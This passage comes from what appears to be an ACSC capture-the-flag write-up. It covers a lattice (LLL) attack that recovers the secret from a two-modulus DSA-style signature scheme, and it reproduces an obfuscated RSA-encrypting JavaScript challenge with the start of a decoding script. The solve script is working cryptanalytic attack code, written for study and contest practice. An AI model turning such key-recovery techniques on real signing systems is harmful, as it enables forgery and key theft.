    <span class="n">gk2</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">s2inv</span><span class="o">*</span><span class="n">z</span><span class="p">,</span> <span class="n">p2</span><span class="p">)</span> <span class="o">*</span> <span class="nb">pow</span><span class="p">(</span><span class="n">y2</span><span class="p">,</span> <span class="n">s2inv</span><span class="o">*</span><span class="n">r2</span><span class="p">,</span> <span class="n">p2</span><span class="p">)</span> <span class="o">%</span> <span class="n">p2</span>

    <span class="k">return</span> <span class="n">r1</span> <span class="o">==</span> <span class="n">gk1</span> <span class="ow">and</span> <span class="n">r2</span> <span class="o">==</span> <span class="n">gk2</span>


<span class="n">m</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"omochi mochimochi mochimochi omochi"</span>
<span class="n">sig1</span><span class="p">,</span> <span class="n">sig2</span> <span class="o">=</span> <span class="n">sign</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"g = </span><span class="si">{</span><span class="n">g</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"p1, p2 = </span><span class="si">{</span><span class="n">p1</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">p2</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"y1, y2 = </span><span class="si">{</span><span class="n">y1</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">y2</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"m = </span><span class="si">{</span><span class="n">m</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"r1, s1 = </span><span class="si">{</span><span class="n">sig1</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"r2, s2 = </span><span class="si">{</span><span class="n">sig2</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>

<p>The value for r = 4^k, and y = 4^x is actually a trap.</p>

<p>The discrete log problem is impossible for these p and q.</p>

<p><br /></p>

<p>Then we can see that only the value of s can be useful without being an exponent.</p>

<center>$s1 = (z + x * r1) / k \; (mod \, q1)$</center>

<center>$s2 = (z + x * r2) / k \; (mod \, q2)$</center>

<p>I had a lot of trials and errors to come up with this simple solution.</p>

<p>Let</p>
<center>$r = crt([r1, r2], [q1, q2])$ and $s = crt([s1, s2], [q1, q2])$</center>

<p>Then:</p>

<center>$s = (z + x * r) / k mod (q1 * q2) \; \to \; k * s - x * r = z \; (mod \, q1 * q2)$</center>

<p><br /></p>

<p>When we observe the size of variables used here,</p>

<p>s and r and q1 * q2 is around 1000 bits, and k, x is around 512 bits.</p>

<p>With this, we can obviously see we can get both k and x with LLL algorithm.</p>

<p><br /></p>

<h3 id="exsage-1"><strong>ex.sage</strong></h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha256</span>
<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">h</span><span class="p">(</span><span class="n">m</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">sha256</span><span class="p">(</span><span class="n">m</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">even_chk</span><span class="p">(</span><span class="n">val</span><span class="p">,</span> <span class="n">p</span><span class="p">):</span>
    <span class="n">q</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
    <span class="k">return</span> <span class="nb">pow</span><span class="p">(</span><span class="n">Integer</span><span class="p">(</span><span class="n">val</span><span class="p">),</span> <span class="n">q</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span>

<span class="n">g</span> <span class="o">=</span> <span class="mi">4</span>
<span class="n">p1</span><span class="p">,</span> <span class="n">p2</span> <span class="o">=</span> <span class="mi">6276170351477662358610296265757659534898563584329624403861678676207084984210281982964595245398676819568696602458985212398017251665201155991266054305219383699</span><span class="p">,</span> <span class="mi">6592790035600261324619481304533463005761130886111654202136347967085156073379713687101783875841638513262245459729322943177912713281466956529743757383039213839</span>
<span class="n">y1</span><span class="p">,</span> <span class="n">y2</span> <span class="o">=</span> <span class="mi">4402230695629594751098609664164747722309480897222957264699530671849221909102875035849237359507796750078710393158944361439911537205013148370997499859214033074</span><span class="p">,</span> <span class="mi">1681962252704346790535503180583651281903938541944441796556533586799974913619493902209110690623728835694029912753819263510084101226503501626563053650880055759</span>
<span class="n">m</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'omochi mochimochi mochimochi omochi'</span>
<span class="n">r1</span><span class="p">,</span> <span class="n">s1</span> <span class="o">=</span> <span class="p">(</span><span class="mi">2059408995750136677433298244389263055046695445249968690077607175900623237060138734944126780231327500254319039236115174790677322287273023749694890125234033630</span><span class="p">,</span> <span class="mi">705204023016308665771881112578269844527040578525414513229064579516151996129198705744493237004425745778721444958494868745594673773644781132717640592278534802</span><span class="p">)</span>
<span class="n">r2</span><span class="p">,</span> <span class="n">s2</span> <span class="o">=</span> <span class="p">(</span><span class="mi">3246603518972133458487019157522113455602145970917894172952170087044203882577925192461339870709563972992589487629762432781841010769867505736764230484818447604</span><span class="p">,</span> <span class="mi">2142497127325776381345617721109438439759390966544000203818908086062572965004742554536684765731611856029799528558073686810627789363181741779462572364133421373</span><span class="p">)</span>

<span class="n">q1</span><span class="p">,</span> <span class="n">q2</span> <span class="o">=</span> <span class="p">(</span><span class="n">p1</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span><span class="p">,</span> <span class="p">(</span><span class="n">p2</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>

<span class="n">mod</span> <span class="o">=</span> <span class="n">q1</span> <span class="o">*</span> <span class="n">q2</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">crt</span><span class="p">([</span><span class="n">s1</span><span class="p">,</span> <span class="n">s2</span><span class="p">],</span> <span class="p">[</span><span class="n">q1</span><span class="p">,</span> <span class="n">q2</span><span class="p">])</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">crt</span><span class="p">([</span><span class="n">r1</span><span class="p">,</span> <span class="n">r2</span><span class="p">],</span> <span class="p">[</span><span class="n">q1</span><span class="p">,</span> <span class="n">q2</span><span class="p">])</span>

<span class="n">z</span> <span class="o">=</span> <span class="n">h</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>

<span class="n">large_val</span> <span class="o">=</span> <span class="mi">2</span><span class="o">^</span><span class="mi">51200</span>
<span class="n">semi_large_val</span> <span class="o">=</span> <span class="mi">2</span><span class="o">^</span><span class="mi">512</span>
<span class="n">M</span> <span class="o">=</span> <span class="n">Matrix</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span>



<span class="n">M</span><span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">M</span><span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span> <span class="o">*</span> <span class="n">large_val</span>

<span class="n">M</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">M</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">r</span> <span class="o">*</span> <span class="n">large_val</span>

<span class="n">M</span><span class="p">[</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">M</span><span class="p">[</span><span class="mi">2</span><span class="p">,</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">mod</span> <span class="o">*</span> <span class="n">large_val</span>

<span class="n">M</span><span class="p">[</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">semi_large_val</span>
<span class="n">M</span><span class="p">[</span><span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">z</span> <span class="o">*</span> <span class="n">large_val</span>

<span class="n">M</span> <span class="o">=</span> <span class="n">M</span><span class="p">.</span><span class="n">LLL</span><span class="p">()</span>



<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">mod</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">z</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">M</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>

<span class="k">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="mi">10978440062277053652764559437887664995011751729079641103901238081830337367710138929485979834835785010461786500993090676159613671537658313815825983947133</span><span class="p">))</span>




<span class="c1"># ACSC{okay_you_must_be_over_twice_as_powerful_as_the_DSA}
</span></code></pre></div></div>

<p><br /><br /></p>

<h2 id="reversing--serverless-109-solves"><strong>Reversing - serverless (109 solves)</strong></h2>

<h3 id="encryptjs"><strong>encrypt.js</strong></h3>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nb">document</span><span class="p">[</span><span class="dl">'</span><span class="s1">querySelector</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">form</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">a</span><span class="p">[</span><span class="dl">'</span><span class="s1">addEventListener</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">submit</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">c</span><span class="p">[</span><span class="dl">'</span><span class="s1">preventDefault</span><span class="dl">'</span><span class="p">]();</span>
    <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nb">document</span><span class="p">[</span><span class="dl">'</span><span class="s1">querySelector</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">textarea[name=</span><span class="se">\'</span><span class="s1">message</span><span class="se">\'</span><span class="s1">]</span><span class="dl">'</span><span class="p">)[</span><span class="dl">'</span><span class="s1">value</span><span class="dl">'</span><span class="p">],</span>
        <span class="nx">e</span> <span class="o">=</span> <span class="nb">document</span><span class="p">[</span><span class="dl">'</span><span class="s1">querySelector</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">input[name=</span><span class="se">\'</span><span class="s1">password</span><span class="se">\'</span><span class="s1">]</span><span class="dl">'</span><span class="p">)[</span><span class="dl">'</span><span class="s1">value</span><span class="dl">'</span><span class="p">],</span>
        <span class="nx">f</span> <span class="o">=</span> <span class="nb">document</span><span class="p">[</span><span class="dl">'</span><span class="s1">querySelector</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">input[name=</span><span class="se">\'</span><span class="s1">encrypt</span><span class="se">\'</span><span class="s1">]</span><span class="dl">'</span><span class="p">),</span>
        <span class="nx">g</span> <span class="o">=</span> <span class="nx">b</span><span class="p">(</span><span class="nx">d</span><span class="p">,</span> <span class="nx">e</span><span class="p">),</span>
        <span class="nx">h</span> <span class="o">=</span> <span class="nb">document</span><span class="p">[</span><span class="dl">'</span><span class="s1">querySelector</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">p.response</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">h</span> <span class="o">&amp;&amp;</span> <span class="nx">h</span><span class="p">[</span><span class="dl">'</span><span class="s1">remove</span><span class="dl">'</span><span class="p">]();</span>
    <span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="nb">document</span><span class="p">[</span><span class="dl">'</span><span class="s1">createElement</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">p</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">i</span><span class="p">[</span><span class="dl">'</span><span class="s1">classList</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">add</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">response</span><span class="dl">'</span><span class="p">),</span> <span class="nx">i</span><span class="p">[</span><span class="dl">'</span><span class="s1">textContent</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">Encrypted message: </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">g</span><span class="p">,</span> <span class="nx">f</span><span class="p">[</span><span class="dl">'</span><span class="s1">insertAdjacentElement</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">afterend</span><span class="dl">'</span><span class="p">,</span> <span class="nx">i</span><span class="p">);</span>
<span class="p">});</span>

<span class="kd">function</span> <span class="nx">b</span><span class="p">(</span><span class="nx">d</span><span class="p">,</span> <span class="nx">f</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">g</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x9940435684b6dcfe5beebb6e03dc894e26d6ff83faa9ef1600f60a0a403880ee166f738dd52e3073d9091ddabeaaff27c899a5398f63c39858b57e734c4768b7</span><span class="nx">n</span><span class="p">,</span> <span class="mh">0xbd0d6bef9b5642416ffa04e642a73add5a9744388c5fbb8645233b916f7f7b89ecc92953c62bada039af19caf20ecfded79f62d99d86183f00765161fcd71577</span><span class="nx">n</span><span class="p">,</span> <span class="mh">0xa9fe0fe0b400cd8b58161efeeff5c93d8342f9844c8d53507c9f89533a4b95ae5f587d79085057224ca7863ea8e509e2628e0b56d75622e6eace59d3572305b9</span><span class="nx">n</span><span class="p">,</span> <span class="mh">0x8b7f4e4d82b59122c8b511e0113ce2103b5d40c549213e1ec2edba3984f4ece0346ab1f3f3c0b25d02c1b21d06e590f0186635263407e0b2fa16c0d0234e35a3</span><span class="nx">n</span><span class="p">,</span> <span class="mh">0xf840f1ee2734110a23e9f9e1a05b78eb711c2d782768cef68e729295587c4aa4af6060285d0a2c1c824d2c901e5e8a1b1123927fb537f61290580632ffea0fbb</span><span class="nx">n</span><span class="p">,</span> <span class="mh">0xdd068fd4984969a322c1c8adb4c8cc580adf6f5b180b2aaa6ec8e853a6428a219d7bffec3c3ec18c8444e869aa17ea9e65ed29e51ace4002cdba343367bf16fd</span><span class="nx">n</span><span class="p">,</span> <span class="mh">0x96e2cefe4c1441bec265963da4d10ceb46b7d814d5bc15cc44f17886a09390999b8635c8ffc7a943865ac67f9043f21ca8d5e4b4362c34e150a40af49b8a1699</span><span class="nx">n</span><span class="p">,</span> <span class="mh">0x81834f81b3b32860a6e7e741116a9c446ebe4ba9ba882029b7922754406b8a9e3425cad64bda48ae352cdc71a7d9b4b432f96f51a87305aebdf667bc8988d229</span><span class="nx">n</span><span class="p">,</span> <span class="mh">0xd8200af7c41ff37238f210dc8e3463bc7bcfb774be93c4cff0e127040f63a1bce5375de96b379c752106d3f67ec8dceca3ed7b69239cf7589db9220344718d5f</span><span class="nx">n</span><span class="p">,</span> <span class="mh">0xb704667b9d1212ae77d2eb8e3bd3d5a4cd19aa36fc39768be4fe0656c78444970f5fc14dc39a543d79dfe9063b30275033fc738116e213d4b6737707bb2fd287</span><span class="nx">n</span><span class="p">],</span>
        <span class="nx">h</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xd4aa1036d7d302d487e969c95d411142d8c6702e0c4b05e2fbbe274471bf02f8f375069d5d65ab9813f5208d9d7c11c11d55b19da1132c93eaaaba9ed7b3f9b1</span><span class="nx">n</span><span class="p">,</span> <span class="mh">0xc9e55bae9f5f48006c6c01b5963199899e1cdf364759d9ca5124f940437df36e8492b3c98c680b18cac2a847eddcb137699ffd12a2323c9bc74db2c720259a35</span><span class="nx">n</span><span class="p">,</span> <span class="mh">0xcbcdd32652a36142a02051c73c6d64661fbdf4cbae97c77a9ce1a41f74b45271d3200678756e134fe46532f978b8b1d53d104860b3e81bdcb175721ab222c611</span><span class="nx">n</span><span class="p">,</span> <span class="mh">0xf79dd7feae09ae73f55ea8aa40c49a7bc022c754db41f56466698881f265507144089af47d02665d31bba99b89e2f70dbafeba5e42bdac6ef7c2f22efa680a67</span><span class="nx">n</span><span class="p">,</span> <span class="mh">0xab50277036175bdd4e2c7e3b7091f482a0cce703dbffb215ae91c41742db6ed0d87fd706b622f138741c8b56be2e8bccf32b7989ca1383b3d838a49e1c28a087</span><span class="nx">n</span><span class="p">,</span> <span class="mh">0xb5e8c7706f6910dc4b588f8e3f3323503902c1344839f8fcc8d81bfa8e05fec2289af82d1dd19afe8c30e74837ad58658016190e070b845de4449ffb9a48b1a7</span><span class="nx">n</span><span class="p">,</span> <span class="mh">0xc351c7115ceffe554c456dcc9156bc74698c6e05d77051a6f2f04ebc5e54e4641fe949ea7ae5d5d437323b6a4be7d9832a94ad747e48ee1ebac9a70fe7cfec95</span><span class="nx">n</span><span class="p">,</span> <span class="mh">0x815f17d7cddb7618368d1e1cd999a6cb925c635771218d2a93a87a690a56f4e7b82324cac7651d3fbbf35746a1c787fa28ee8aa9f04b0ec326c1530e6dfe7569</span><span class="nx">n</span><span class="p">,</span> <span class="mh">0xe226576ef6e582e46969e29b5d9a9d11434c4fcfeccd181e7c5c1fd2dd9f3ff19641b9c5654c0f2d944a53d3dcfef032230c4adb788b8188314bf2ccf5126f49</span><span class="nx">n</span><span class="p">,</span> <span class="mh">0x84819ec46812a347894ff6ade71ae351e92e0bd0edfe1c87bda39e7d3f13fe54c51f94d0928a01335dd5b8689cb52b638f55ced38693f0964e78b212178ab397</span><span class="nx">n</span><span class="p">],</span>
        <span class="nx">j</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">[</span><span class="dl">'</span><span class="s1">floor</span><span class="dl">'</span><span class="p">](</span><span class="nb">Math</span><span class="p">[</span><span class="dl">'</span><span class="s1">random</span><span class="dl">'</span><span class="p">]()</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x313</span> <span class="o">*</span> <span class="o">-</span><span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x24c1</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0xc1f</span><span class="p">)),</span>
        <span class="nx">k</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">[</span><span class="dl">'</span><span class="s1">floor</span><span class="dl">'</span><span class="p">](</span><span class="nb">Math</span><span class="p">[</span><span class="dl">'</span><span class="s1">random</span><span class="dl">'</span><span class="p">]()</span> <span class="o">*</span> <span class="p">(</span><span class="o">-</span><span class="mh">0x725</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0x1546</span> <span class="o">+</span> <span class="mh">0x1c75</span><span class="p">)),</span>
        <span class="nx">l</span> <span class="o">=</span> <span class="nx">g</span><span class="p">[</span><span class="nx">j</span><span class="p">],</span>
        <span class="nx">o</span> <span class="o">=</span> <span class="nx">h</span><span class="p">[</span><span class="nx">k</span><span class="p">],</span>
        <span class="nx">r</span> <span class="o">=</span> <span class="nx">l</span> <span class="o">*</span> <span class="nx">o</span><span class="p">,</span>
        <span class="nx">s</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">[</span><span class="dl">'</span><span class="s1">floor</span><span class="dl">'</span><span class="p">](</span><span class="nb">Math</span><span class="p">[</span><span class="dl">'</span><span class="s1">random</span><span class="dl">'</span><span class="p">]()</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x2647</span> <span class="o">+</span> <span class="mh">0x1</span> <span class="o">*</span> <span class="mh">0x2f5</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0x2937</span><span class="p">)),</span>
        <span class="nx">t</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">[</span><span class="dl">'</span><span class="s1">pow</span><span class="dl">'</span><span class="p">](</span><span class="o">-</span><span class="mh">0x14e6</span> <span class="o">+</span> <span class="mh">0x43</span> <span class="o">*</span> <span class="mh">0x55</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0x7</span> <span class="o">*</span> <span class="mh">0x31</span><span class="p">,</span> <span class="nb">Math</span><span class="p">[</span><span class="dl">'</span><span class="s1">pow</span><span class="dl">'</span><span class="p">](</span><span class="o">-</span><span class="mh">0x14e1</span> <span class="o">*</span> <span class="mh">0x1</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0x2697</span> <span class="o">+</span> <span class="mh">0x2e</span> <span class="o">*</span> <span class="mh">0x14b</span><span class="p">,</span> <span class="nx">s</span><span class="p">))</span> <span class="o">+</span> <span class="p">(</span><span class="o">-</span><span class="mh">0x235d</span> <span class="o">+</span> <span class="mh">0x2</span> <span class="o">*</span> <span class="mh">0x82b</span> <span class="o">+</span> <span class="mh">0x3a</span> <span class="o">*</span> <span class="mh">0x54</span><span class="p">);</span>

    <span class="kd">function</span> <span class="nx">u</span><span class="p">(</span><span class="nx">A</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">B</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">TextEncoder</span><span class="p">()[</span><span class="dl">'</span><span class="s1">encode</span><span class="dl">'</span><span class="p">](</span><span class="nx">A</span><span class="p">);</span>
        <span class="kd">let</span> <span class="nx">C</span> <span class="o">=</span> <span class="mh">0x0</span><span class="nx">n</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">D</span> <span class="o">=</span> <span class="mh">0x13c8</span> <span class="o">+</span> <span class="mh">0x1</span> <span class="o">*</span> <span class="mh">0x175b</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0x2b23</span><span class="p">;</span> <span class="nx">D</span> <span class="o">&lt;</span> <span class="nx">B</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span> <span class="nx">D</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">C</span> <span class="o">=</span> <span class="p">(</span><span class="nx">C</span> <span class="o">&lt;&lt;</span> <span class="mh">0x8</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">B</span><span class="p">[</span><span class="nx">D</span><span class="p">]);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nx">C</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kd">var</span> <span class="nx">v</span> <span class="o">=</span> <span class="nx">u</span><span class="p">(</span><span class="nx">d</span><span class="p">);</span>

    <span class="kd">function</span> <span class="nx">w</span><span class="p">(</span><span class="nx">A</span><span class="p">,</span> <span class="nx">B</span><span class="p">,</span> <span class="nx">C</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">B</span> <span class="o">===</span> <span class="o">-</span><span class="mh">0x9d</span> <span class="o">+</span> <span class="mh">0x993</span> <span class="o">+</span> <span class="mh">0x1f</span> <span class="o">*</span> <span class="o">-</span><span class="mh">0x4a</span><span class="p">)</span> <span class="k">return</span> <span class="mh">0x1</span><span class="nx">n</span><span class="p">;</span>
        <span class="k">return</span> <span class="nx">B</span> <span class="o">%</span> <span class="p">(</span><span class="mh">0x1</span> <span class="o">*</span> <span class="mh">0x2dc</span> <span class="o">+</span> <span class="mh">0x28</span> <span class="o">*</span> <span class="o">-</span><span class="mh">0x12</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0xa</span><span class="p">)</span> <span class="o">===</span> <span class="o">-</span><span class="mh">0x2446</span> <span class="o">*</span> <span class="o">-</span><span class="mh">0x1</span> <span class="o">+</span> <span class="mh">0x3</span> <span class="o">*</span> <span class="mh">0xcd5</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0x4ac5</span> <span class="o">*</span> <span class="mh">0x1</span> <span class="p">?</span> <span class="nx">w</span><span class="p">(</span><span class="nx">A</span> <span class="o">*</span> <span class="nx">A</span> <span class="o">%</span> <span class="nx">C</span><span class="p">,</span> <span class="nx">B</span> <span class="o">/</span> <span class="p">(</span><span class="o">-</span><span class="mh">0x6a3</span> <span class="o">*</span> <span class="mh">0x5</span> <span class="o">+</span> <span class="mh">0xcba</span> <span class="o">+</span> <span class="mh">0x1477</span> <span class="o">*</span> <span class="mh">0x1</span><span class="p">),</span> <span class="nx">C</span><span class="p">)</span> <span class="p">:</span> <span class="nx">A</span> <span class="o">*</span> <span class="nx">w</span><span class="p">(</span><span class="nx">A</span><span class="p">,</span> <span class="nx">B</span> <span class="o">-</span> <span class="p">(</span><span class="o">-</span><span class="mh">0x1cd0</span> <span class="o">+</span> <span class="mh">0x11fc</span> <span class="o">+</span> <span class="mh">0xad5</span><span class="p">),</span> <span class="nx">C</span><span class="p">)</span> <span class="o">%</span> <span class="nx">C</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="nx">w</span><span class="p">(</span><span class="nx">v</span><span class="p">,</span> <span class="nx">t</span><span class="p">,</span> <span class="nx">r</span><span class="p">);</span>
    <span class="kd">let</span> <span class="nx">y</span> <span class="o">=</span> <span class="p">[];</span>
    <span class="k">while</span> <span class="p">(</span><span class="nx">x</span> <span class="o">&gt;</span> <span class="mh">0x1</span> <span class="o">*</span> <span class="mh">0x371</span> <span class="o">+</span> <span class="mh">0x1519</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0x188a</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">y</span><span class="p">[</span><span class="dl">'</span><span class="s1">push</span><span class="dl">'</span><span class="p">](</span><span class="nb">Number</span><span class="p">(</span><span class="nx">x</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="nx">n</span><span class="p">)),</span> <span class="nx">x</span> <span class="o">=</span> <span class="nx">x</span> <span class="o">&gt;&gt;</span> <span class="mh">0x8</span><span class="nx">n</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">y</span><span class="p">[</span><span class="dl">'</span><span class="s1">push</span><span class="dl">'</span><span class="p">](</span><span class="nb">Number</span><span class="p">(</span><span class="nx">s</span><span class="p">)),</span> <span class="nx">y</span><span class="p">[</span><span class="dl">'</span><span class="s1">push</span><span class="dl">'</span><span class="p">](</span><span class="nb">Number</span><span class="p">(</span><span class="nx">k</span><span class="p">)),</span> <span class="nx">y</span><span class="p">[</span><span class="dl">'</span><span class="s1">push</span><span class="dl">'</span><span class="p">](</span><span class="nb">Number</span><span class="p">(</span><span class="nx">j</span><span class="p">));</span>
    <span class="kd">var</span> <span class="nx">z</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">TextEncoder</span><span class="p">()[</span><span class="dl">'</span><span class="s1">encode</span><span class="dl">'</span><span class="p">](</span><span class="nx">f</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">A</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0xa00</span> <span class="o">+</span> <span class="mh">0x1</span> <span class="o">*</span> <span class="mh">0x20e0</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0x4</span> <span class="o">*</span> <span class="mh">0x5b8</span><span class="p">;</span> <span class="nx">A</span> <span class="o">&lt;</span> <span class="nx">y</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span> <span class="o">++</span><span class="nx">A</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">y</span><span class="p">[</span><span class="nx">A</span><span class="p">]</span> <span class="o">=</span> <span class="nx">y</span><span class="p">[</span><span class="nx">A</span><span class="p">]</span> <span class="o">^</span> <span class="nx">z</span><span class="p">[</span><span class="nx">A</span> <span class="o">%</span> <span class="nx">z</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">]];</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">btoa</span><span class="p">(</span><span class="nx">y</span><span class="p">[</span><span class="dl">'</span><span class="s1">reverse</span><span class="dl">'</span><span class="p">]());</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Encrypt function is written with javascript.</p>

<p>When we see what this function do, it is just a simple RSA encryption.</p>

<p><br /></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">y</span> <span class="o">=</span> <span class="p">{</span><span class="n">redacted</span><span class="p">}</span>

<span class="n">pw</span> <span class="o">=</span> <span class="s">"acscpass"</span>

<span class="n">y</span><span class="p">.</span><span class="n">reverse</span><span class="p">()</span>


<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">y</span><span class="p">)):</span>
    <span class="n">y</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^^=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">pw</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">8</span><span class="p">])</span>

<span class="k">print</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>

